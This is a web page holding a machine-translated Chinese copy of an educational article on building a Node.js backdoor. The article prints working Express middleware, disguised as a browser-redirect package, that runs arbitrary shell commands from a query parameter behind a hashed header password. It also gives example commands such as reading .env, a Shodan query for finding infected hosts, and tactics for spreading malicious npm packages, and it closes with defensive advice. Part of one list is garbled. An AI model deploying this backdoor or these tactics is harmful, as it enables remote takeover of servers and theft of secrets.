<!doctype html>
<html class="no-js" lang="zh-CN">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-13"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-13');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>👩🏻‍🚀 🥐 👨‍👩‍👧‍👧 认识你的敌人：创建一个Node.js后门 🏈 🧓🏻 💃</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="可以与操作系统无缝交互的自有代码后门，是所有开发人员的噩梦之一。目前，npm有超过120万个公共软件包。在过去的三年中，项目成瘾已成为网络犯罪分子的理想目标。如果开发社区不密切关注安全性，那么npm生态系统可能会令人惊讶地脆弱。作为此想法的证据，只需使用事件流npm包就可以回顾打字错误和事件。 这篇...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://geek-week.github.io/index.html"></a>
    <div class="page-header-text">Get best of the week</div>
  </header>
  <section class="page js-page"><h1>认识你的敌人：创建一个Node.js后门</h1><div class="post__body post__body_full">
      <div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/ruvds/blog/493706/"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可以与操作系统无缝交互的自有代码后门，是所有开发人员的噩梦之一。</font><font style="vertical-align: inherit;">目前，npm有超过120万个公共软件包。</font><font style="vertical-align: inherit;">在过去的三年中，项目成瘾已成为网络犯罪分子的理想目标。</font><font style="vertical-align: inherit;">如果开发社区不密切关注安全性，那么npm生态系统可能会令人惊讶地脆弱。</font><font style="vertical-align: inherit;">作为此想法的证据，只需</font><font style="vertical-align: inherit;">使用事件流npm包</font><font style="vertical-align: inherit;">就可以回顾</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">打字错误</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">事件</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">
这篇文章的作者（我们今天将发表其翻译是）出于教育目的，希望讨论如何为Node.js平台创建后门。</font></font><br>
<br>
<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><img src="https://habrastorage.org/webt/3j/8a/0y/3j8a0ysn9-nbui6_stqwb783zcq.jpeg"></a><br>
<br><font style="vertical-align: inherit;"></font><br>
<a name="habracut"></a><br>
<h2><font color="#3AC1EF"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">什么是后门？</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
这是在</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Malwarebytes</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">资源上给出的“后门”一词的定义</font><font style="vertical-align: inherit;">：“在网络安全领域，后门是授权和未授权用户可以绕过常见的安全措施并获得对计算机系统的高级根访问权限的任何方法，网络应用。</font><font style="vertical-align: inherit;">在获得对系统的这种访问权限之后，网络罪犯可以使用后门窃取个人和财务数据，安装其他恶意软件并入侵设备。” </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
后门由两个主要部分组成：</font></font><br>
<br>
<ol>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">嵌入并在受攻击的系统上执行的恶意代码</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">开放的通信渠道，使攻击者可以将命令发送到后门并控制远程计算机。</font></font></li>
</ol><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
将向安装在计算机上的后门发送命令以响应其执行某些操作。这些命令可以是旨在从系统中提取有价值的信息（例如环境变量）的命令，也可以是旨在对数据库进行攻击的命令。此外，执行此类命令可能会导致影响单个计算机或整个网络的其他进程发生变化。攻击的规模取决于受感染的应用程序具有的权限。在我们的案例中，我们正在谈论为Node.js平台编写的应用程序。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
为了创建实现上述攻击的程序的简化版本，我们将使用标准模块</font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;">child_process</font></a><font style="vertical-align: inherit;">来执行代码</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;"></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">为了与后门建立通信，我们使用HTTP服务器。</font><font style="vertical-align: inherit;">我建议您在这种情况下使用Express框架，该框架以其强大的功能而闻名，但是可以使用任何其他合适的工具来实现将要讨论的内容。</font></font><br>
<br>
<h2><font color="#3AC1EF"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为什么我们需要child_process？</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
标准的Node.js模块</font></font><code>child_process</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可用于启动子进程。</font><font style="vertical-align: inherit;">这里的主要思想是，它使我们有机会执行命令（通过标准输入流-进入过程</font></font><code>stdin</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">），例如</font></font><code>pwd</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">或</font></font><code>ping snyk.io</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，然后集成这些命令的结果（输出来自输出流- </font></font><code>stdout</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">）和可能的错误消息（来自流</font></font><code>stderr</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">）到主程序。</font></font><br>
<br>
<div style="text-align:center;"><img src="https://habrastorage.org/getpro/habr/post_images/e3c/666/71e/e3c66671ef56b974c1a7692f7962c479.png"></div><br>
<i><font color="#999999"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">进程执行及其与标准输入，输出和错误流的关系，它们在运行中的系统进程中扮演输入和输出流的角色，</font></font></font></i><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 
有多种执行子进程的方法。</font><font style="vertical-align: inherit;">对于这种攻击，最简单的方法是使用一个函数</font></font><code>exec</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，</font><font style="vertical-align: inherit;">该函数</font><font style="vertical-align: inherit;">允许您回调并将进入</font></font><code>stdout</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font><font style="vertical-align: inherit;">流的内容放入适当的缓冲区</font></font><code>stderr</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">例如，将作为命令结果发布</font></font><code>cat passwords.txt</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">请注意，函数</font></font><code>exec</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不是执行冗长的任务（如）的最佳方法</font></font><code>ping snyk.io</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font><br>
<br>
<pre><code class="javascript hljs"><span class="hljs-keyword">const</span>&nbsp; {exec} = <span class="hljs-built_in">require</span>(<span class="hljs-string">'child_process'</span>);<font></font>
<font></font>
exec(<span class="hljs-string">'cat .env'</span>, (err, stdout, stderr) =&gt; {
&nbsp;&nbsp;<span class="hljs-keyword">if</span>(err) <span class="hljs-keyword">throw</span> err
&nbsp;&nbsp;<span class="hljs-keyword">if</span>(stderr) <span class="hljs-keyword">return</span> <span class="hljs-built_in">console</span>.log(<span class="hljs-string">`Execution error: <span class="hljs-subst">${stderr}</span>`</span>)
&nbsp;&nbsp;<span class="hljs-built_in">console</span>.log(<span class="hljs-string">`Env file content:&nbsp; <span class="hljs-subst">${stdout}</span>`</span>)<font></font>
})<font></font>
</code></pre><br>
<h2><font color="#3AC1EF"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如何将exec函数与HTTP服务器结合？</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
我</font><font style="vertical-align: inherit;">为Express应用程序</font><font style="vertical-align: inherit;">开发了一个简单，外观纯真的</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">浏览器重定向</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">中间件程序包</font><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">它将非Chrome用户重定向到</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">browserhappy.com</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">我将在此程序包中包含恶意代码。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
软件包代码将如下所示：</font></font><br>
<br>
<pre><code class="javascript hljs"><span class="hljs-keyword">const</span> useragent = <span class="hljs-built_in">require</span>(<span class="hljs-string">'useragent'</span>);<font></font>
<font></font>
<span class="hljs-built_in">module</span>.exports = <span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> <span class="hljs-function">(<span class="hljs-params">req, res, next</span>) =&gt;</span> {&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">const</span> ua = useragent.is(req.headers[<span class="hljs-string">'user-agent'</span>]);<font></font>
&nbsp;&nbsp;&nbsp;&nbsp;ua.chrome ? next(): res.redirect(<span class="hljs-string">"https://browsehappy.com/"</span>)<font></font>
}<font></font>
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
受害者只要安装软件包并在Express应用程序中使用它就足够了，就像他们在中间层使用任何软件包一样：</font></font><br>
<br>
<pre><code class="javascript hljs"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">"express"</span>);
<span class="hljs-keyword">const</span> helmet = <span class="hljs-built_in">require</span>(<span class="hljs-string">"helmet"</span>)
<span class="hljs-keyword">const</span> browserRedirect = <span class="hljs-built_in">require</span>(<span class="hljs-string">"browser-redirect "</span>)<font></font>
&nbsp;<font></font>
<span class="hljs-keyword">const</span> app = express();<font></font>
&nbsp;<font></font>
app.use(browserRedirect())<font></font>
app.use(helmet())<font></font>
&nbsp;<font></font>
app.get(<span class="hljs-string">"/"</span>, (req, res)=&gt;{<font></font>
&nbsp;&nbsp;&nbsp;&nbsp;res.send(<span class="hljs-string">"Hello Chrome User!"</span>)<font></font>
})<font></font>
&nbsp;<font></font>
app.listen(<span class="hljs-number">8080</span>)
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
请注意，在这种情况下，即使使用</font></font><code>Helmet</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，也不能保护应用程序免受攻击。</font></font><br>
<br>
<h2><font color="#3AC1EF"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">恶意代码</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
恶意代码的实现非常简单：</font></font><br>
<br>
<pre><code class="javascript hljs"><span class="hljs-keyword">const</span> {exec} = <span class="hljs-built_in">require</span>(<span class="hljs-string">"child_process"</span>)
<span class="hljs-keyword">const</span> crypto = <span class="hljs-built_in">require</span>(<span class="hljs-string">'crypto'</span>);
<span class="hljs-keyword">const</span> useragent = <span class="hljs-built_in">require</span>(<span class="hljs-string">'useragent'</span>);<font></font>
&nbsp;<font></font>
<span class="hljs-built_in">module</span>.exports = <span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> <span class="hljs-function">(<span class="hljs-params">req, res, next</span>) =&gt;</span> {
&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-comment">//  </span>
&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">const</span> {cmd} = req.query;
&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">const</span> hash = crypto.createHash(<span class="hljs-string">'md5'</span>)<font></font>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.update(<span class="hljs-built_in">String</span>(req.headers[<span class="hljs-string">"knock_knock"</span>]))<font></font>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.digest(<span class="hljs-string">"hex"</span>);<font></font>
&nbsp;&nbsp;&nbsp;&nbsp;res.setHeader(<span class="hljs-string">"Content-Sec-Policy"</span>, <span class="hljs-string">"default-src 'self'"</span>)
&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>(cmd &amp;&amp; hash === <span class="hljs-string">"c4fbb68607bcbb25407e0362dab0b2ea"</span>) {
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">return</span> exec(cmd, (err, stdout, stderr)=&gt;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">return</span> res.send(<span class="hljs-built_in">JSON</span>.stringify({err, stdout, stderr}, <span class="hljs-literal">null</span>, <span class="hljs-number">2</span>))<font></font>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;})<font></font>
&nbsp;&nbsp;&nbsp;&nbsp;}<font></font>
&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-comment">//  </span>
&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">const</span> ua = useragent.is(req.headers[<span class="hljs-string">'user-agent'</span>]);<font></font>
&nbsp;&nbsp;&nbsp;&nbsp;ua.chrome ? next(): res.redirect(<span class="hljs-string">"https://browsehappy.com/"</span>)<font></font>
}<font></font>
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
我们的后门如何运作？</font><font style="vertical-align: inherit;">要回答此问题，请考虑以下事项：</font></font><br>
<br>
<ol>
<li>,           .         .      md5- ( <code>p@ssw0rd1234</code>   <code>c4fbb68607bcbb25407e0362dab0b2ea</code>).           <code>knock_knock</code>. ,   ,  ,      .</li>
<li>,          .       ,     .        <code>Content-Sec-Policy</code>,      <code>Content-security-policy</code>.   —      .     .       Shodan,   <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="></a>: <code>/search?query=Content-Sec-Policy%3A+default-src+%27self%27</code>.</li>
<li>  <code>?cmd</code>         .         .       <code>victim.com/?cmd=whoami</code>  <code>?cmd=cat .env</code>        JSON.</li>
</ol><br>
<h2><font color="#3AC1EF">  </font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
既然后门代码已经准备好，您需要考虑如何分发恶意软件包。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
第一步是发布程序包。我</font></font><code>browser-redirect@1.0.2</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在npm中</font><font style="vertical-align: inherit;">发布了该软件包</font><font style="vertical-align: inherit;">。但是，如果您查看项目的GitHub存储库，那么恶意代码将不会存在。亲自看看-看一下</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">项目分支</font><font style="vertical-align: inherit;">并发布</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.0.2</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。这是可能的，因为npm不会使用某些旨在与源代码一起工作的系统中发布的代码来验证发布的软件包的代码。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
尽管该软件包在npm上发布，但分发的机会仍然非常低，因为潜在的受害者仍然需要找到并安装它。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
分发软件包的另一种方法是添加恶意模块作为其他软件包的依赖项。如果攻击者可以使用具有某些重要程序包发布权的帐户访问帐户，则可以发布该程序包的新版本。软件包新版本的依赖项还将包括一个后门。因此，我们正在谈论将恶意软件包直接包含在流行项目的依赖项中（请看一下</font><font style="vertical-align: inherit;">事件流中发生</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">事件</font><font style="vertical-align: inherit;">的</font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;">分析</font></a><font style="vertical-align: inherit;">）。或者，攻击者可以通过对锁定文件进行适当的更改来尝试在项目中进行PR。</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在这里</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">阅读</font><font style="vertical-align: inherit;">。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
需要考虑的另一个重要因素是，攻击者可以访问支持某个受欢迎项目的人员的凭据（用户名和密码）。如果攻击者拥有此类数据，则他可以轻松地发布软件包的新版本-就像</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">eslint一样</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
但是即使支持该项目的人使用两因素身份验证来发布它，他仍然会冒险。而且，当使用持续集成系统来部署项目的新版本时，必须关闭两因素身份验证。结果，如果攻击者可以为连续集成系统窃取有效的npm令牌（例如，从意外公开的日志，数据泄漏和其他类似来源中窃取），则他将能够部署包含恶意代码的新版本。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
请注意，</font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;">新的API</font></a><font style="vertical-align: inherit;">已发布</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（仍处于私有测试版状态），这使您可以确定是否使用TOR网络的IP地址发布了该程序包，以及在发布时是否使用了双重身份验证。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
此外，攻击者可以配置恶意代码，以使其以脚本的形式运行，该脚本在安装之前或安装任何npm软件包之后执行。</font><font style="vertical-align: inherit;">npm软件包</font><font style="vertical-align: inherit;">有</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标准的</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">生命周期</font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;">挂钩，</font></a><font style="vertical-align: inherit;">可让您在特定时间在用户计算机上执行代码。例如，用于在浏览器中组织测试项目的系统</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Puppeteer</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用这些挂钩</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Chromium </font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;">安装</font></a><font style="vertical-align: inherit;">在主机系统上。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
瑞安·达尔（Ryan Dahl）已经</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">说过</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有关JSConf EU 2018的这些漏洞的信息。Node.js平台需要更高级别的保护，以防止此攻击和其他攻击媒介。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
以下是</font><font style="vertical-align: inherit;">开源软件</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">安全性</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">研究的</font><font style="vertical-align: inherit;">一些结论</font><font style="vertical-align: inherit;">：</font></font><br>
<br>
<ul>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在间接依赖项中发现了78％的漏洞，这使摆脱此类漏洞的过程变得复杂。</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在过去的两年中，图书馆中的漏洞增加了88％。</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">81％的受访者认为开发人员应该对安全负责。</font><font style="vertical-align: inherit;">此外，他们认为开发人员对此没有做好充分的准备。</font></font></li>
</ul><br>
<h2><font color="#3AC1EF"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">结果：如何保护自己免受后门攻击？</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
控制依赖关系并不总是那么容易，但是一些技巧可以帮助您：</font></font><br>
<br>
<ul>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用知名且受支持的库。</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">参与社区生活并帮助那些支持图书馆的人。</font><font style="vertical-align: inherit;">帮助可能包括编写代码或为项目提供财务支持。</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NQP</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">分析项目的新依赖关系。</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用Snyk可以随时了解漏洞并监视您的项目。</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">分析存储在npm中的正在使用的依赖项的代码。</font><font style="vertical-align: inherit;">不要局限于查看来自GitHub或其他类似系统的代码。</font></font></li>
</ul><br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">亲爱的读者们！</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">您如何使用他人的代码保护您的项目？</font></font><br>
<br>
<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><img src="https://habrastorage.org/webt/iq/fi/b4/iqfib45pgphfrxv--zfemt0qnmw.jpeg"></a></div>
      
    </div>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../zh-CN493692/index.html">理论数据结构及其在JavaScript中的应用。P1。情侣</a></li>
<li><a href="../zh-CN493696/index.html">在Linux上加速Qemu KVM磁盘子系统</a></li>
<li><a href="../zh-CN493700/index.html">在Azure中使用恶意软件来访问Microsoft 365租户</a></li>
<li><a href="../zh-CN493702/index.html">大规模过渡到远程工作：技术问题和对安全的威胁</a></li>
<li><a href="../zh-CN493704/index.html">在JavaScript中使用TypeScript而不编写TypeScript</a></li>
<li><a href="../zh-CN493708/index.html">我的家庭Kubernetes集群的剖析</a></li>
<li><a href="../zh-CN493712/index.html">新的TypeScript功能可增强可用性</a></li>
<li><a href="../zh-CN493714/index.html">安全备忘单：Node.js</a></li>
<li><a href="../zh-CN493716/index.html">使用as const构造和infer关键字使用TypeScript进行类型推断</a></li>
<li><a href="../zh-CN493718/index.html">讨论：很少使用且当前正在使用的标准UNIX实用程序</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter63335242 = new Ya.Metrika({
                  id:63335242,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/63335242" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-13', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Geek Week | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2020</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
